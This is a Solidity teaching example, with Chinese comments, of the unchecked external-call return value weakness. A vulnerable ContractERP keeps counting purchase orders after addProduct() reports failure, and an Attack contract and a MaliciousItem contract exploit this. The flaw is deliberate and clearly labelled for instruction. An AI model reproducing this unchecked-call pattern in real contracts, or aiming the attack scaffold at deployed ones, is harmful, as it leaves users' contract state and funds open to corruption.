pragma solidity >=0.8.0;

// 以下是漏洞範例，展示 Improper Check of External Call Return Value 漏洞

// 合約 Item 沒有進行嚴格的處理和回傳檢查
contract Item {
    // 漏洞重點：addProduct 未正確處理回傳值，可被惡意利用
    function addProduct() external returns (bool) {
        // 模擬邏輯：此處故意回傳 false，代表產品新增失敗，但 ContractERP 並不檢查此結果
        return false;
    }
}

// ContractERP 呼叫外部的 addProduct，但未檢查返回值，可能導致後續邏輯錯誤
contract ContractERP {
    uint public orderCount = 0; // 狀態變數，代表採購單數量

    function newPurchaseOrder(Item product) public {
        // 漏洞：沒有檢查 product.addProduct() 回傳值是否為 true
        product.addProduct(); // 此處未進行檢查，導致即使新增產品失敗，仍會繼續處理訂單
        // 後續處理邏輯可能依賴於新增產品成功，但未作驗證
        orderCount++;
    }
}

// 攻擊示範：利用惡意合約覆寫 addProduct 回傳值，藉由不正確的檢查繞過邏輯
contract MaliciousItem {
    // 漏洞重點：攻擊者利用惡意邏輯，刻意回傳 false
    function addProduct() external returns (bool) {
        // 模擬攻擊：故意回傳 false，代表產品未正確新增
        return false;
    }
}

// 攻擊合約：模擬攻擊者利用漏洞，將惡意合約惡意傳入 ContractERP
contract Attack {
    ContractERP public erp;
    MaliciousItem public maliciousItem;

    constructor() {
        // 部署 ContractERP 與 MaliciousItem
        erp = new ContractERP();
        maliciousItem = new MaliciousItem();
    }

    // executeAttack() 呼叫 ContractERP 的 newPurchaseOrder，使用惡意的 MaliciousItem
    function executeAttack() public {
        // 因為 ContractERP 未檢查返回值，即使 maliciousItem.addProduct() 失敗，也會增加 orderCount
        erp.newPurchaseOrder(Item(address(maliciousItem)));
    }
}

/*
攻擊示範說明：
1. 部署 ContractERP 與 MaliciousItem（惡意合約），
2. 攻擊者呼叫 Attack 合約中的 executeAttack()，
3. ContractERP 呼叫 maliciousItem.addProduct() 回傳 false，
4. 由於沒有檢查返回值，合約依然更新 orderCount，導致採購訂單增加，這可能讓系統處於錯誤狀態。
*/